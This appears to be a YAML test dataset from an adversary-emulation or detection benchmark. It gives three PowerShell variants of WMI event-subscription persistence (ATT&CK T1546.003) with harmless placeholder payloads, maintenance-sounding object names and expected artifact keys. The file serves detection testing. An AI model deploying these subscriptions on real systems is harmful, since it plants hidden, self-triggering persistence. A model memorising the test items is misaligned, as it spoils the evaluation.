  - technique_id: "T1546.003"
    name: "WMI Event Subscription Persistence"
    tactic: "persistence"
    split: "dev"
    variants:
      - variant: 1
        verify_hint: "WMI EventFilter + CommandLineEventConsumer + Binding in root\\subscription"
        expected_artifact_keys:
          - "file|c:\\programdata\\wmimon\\log_rotate_v1.cmd|log_rotate_v1.cmd"
          - "wmi_subscription|root\\subscription\\__eventfilter|diskquotafilterv1"
          - "wmi_subscription|root\\subscription\\commandlineeventconsumer|diskquotaconsumerv1"
        steps:
          - action: "create_wmi_subscription"
            cmd: |
              [void][System.IO.Directory]::CreateDirectory('C:\ProgramData\WmiMon')
              [System.IO.File]::WriteAllText('C:\ProgramData\WmiMon\log_rotate_v1.cmd', "@echo off`r`ndate /t > C:\ProgramData\WmiMon\rot_v1.txt`r`n")
              $flt = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name='DiskQuotaFilterV1'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" }
              $con = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name='DiskQuotaConsumerV1'; CommandLineTemplate='cmd.exe /c C:\ProgramData\WmiMon\log_rotate_v1.cmd' }
              [void](Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$flt; Consumer=$con })

      - variant: 2
        verify_hint: "WMI EventFilter + CommandLineEventConsumer targeting PowerShell script"
        expected_artifact_keys:
          - "file|c:\\users\\public\\net_probe_v2.ps1|net_probe_v2.ps1"
          - "wmi_subscription|root\\subscription\\__eventfilter|netprobeintervalv2"
          - "wmi_subscription|root\\subscription\\commandlineeventconsumer|netprobehandlerv2"
        steps:
          - action: "create_wmi_ps_subscription"
            cmd: |
              [System.IO.File]::WriteAllText('C:\Users\Public\net_probe_v2.ps1', 'hostname | Out-File C:\Users\Public\probe_v2.txt')
              $flt = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name='NetProbeIntervalV2'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'" }
              $con = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name='NetProbeHandlerV2'; CommandLineTemplate='powershell.exe -NoProfile -File C:\Users\Public\net_probe_v2.ps1' }
              [void](Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$flt; Consumer=$con })

      - variant: 3
        verify_hint: "WMI ActiveScriptEventConsumer + EventFilter + Binding"
        expected_artifact_keys:
          - "file|c:\\windows\\temp\\wmi_stage_v3.vbs|wmi_stage_v3.vbs"
          - "wmi_subscription|root\\subscription\\__eventfilter|sessionauditfilterv3"
          - "wmi_subscription|root\\subscription\\activescripteventconsumer|sessionauditscriptv3"
        steps:
          - action: "create_wmi_activescript"
            cmd: |
              [System.IO.File]::WriteAllText('C:\Windows\Temp\wmi_stage_v3.vbs', 'WScript.Quit 0')
              $flt = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name='SessionAuditFilterV3'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_LogonSession'" }
              $con = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{ Name='SessionAuditScriptV3'; ScriptingEngine='VBScript'; ScriptText='Dim x : x = 1' }
              [void](Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$flt; Consumer=$con })

